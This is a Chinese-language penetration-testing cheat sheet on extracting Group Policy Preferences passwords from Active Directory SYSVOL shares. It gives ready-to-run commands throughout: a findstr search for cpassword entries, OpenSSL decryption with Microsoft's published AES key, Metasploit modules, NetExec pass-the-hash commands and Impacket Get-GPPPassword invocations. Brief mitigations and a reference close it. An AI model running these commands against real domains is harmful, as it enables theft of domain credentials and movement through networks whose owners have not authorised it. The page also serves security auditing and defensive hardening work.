# 密码 - 组策略首选项 (Group Policy Preferences)

在 SYSVOL 中寻找密码 (MS14-025)。SYSVOL 是 Active Directory 中的域范围共享，所有经过身份验证的用户都具有读访问权限。所有的域组策略都存储在这里：`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`。

```powershell
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

使用 Microsoft 在 [MSDN - 2.2.1.1.4 Password Encryption](https://msdn.microsoft.com/en-us/library/cc422924.aspx) 中提供的 32 字节 AES 密钥，对在 SYSVOL 中找到的组策略密码进行解密（由 [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280) 发现）

```bash
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

e.g: 
echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

## 自动化 SYSVOL 和密码查找 (Automate the SYSVOL and passwords research)

* 用于枚举共享和凭据的 `Metasploit` 模块

    ```c
    scanner/smb/smb_enumshares
    post/windows/gather/enum_shares
    post/windows/gather/credentials/gpp
    ```

* NetExec 模块

    ```powershell
    nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
    nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
    ```

* [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)

  ```powershell
  # 使用空会话 (with a NULL session)
  Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

  # 使用明文凭据 (with cleartext credentials)
  Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

  # 哈希传递 (pass-the-hash)
  Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
  ```

## 缓解措施 (Mitigations)

* 在用于管理 GPO 的所有计算机上安装 [KB2962486](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025)，以防止新的凭据被放置到组策略首选项中。
* 删除 SYSVOL 中包含密码的现有 GPP xml 文件。
* 不要将密码放在所有经过身份验证的用户都能访问的文件中。

## 参考资料 (References)

* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
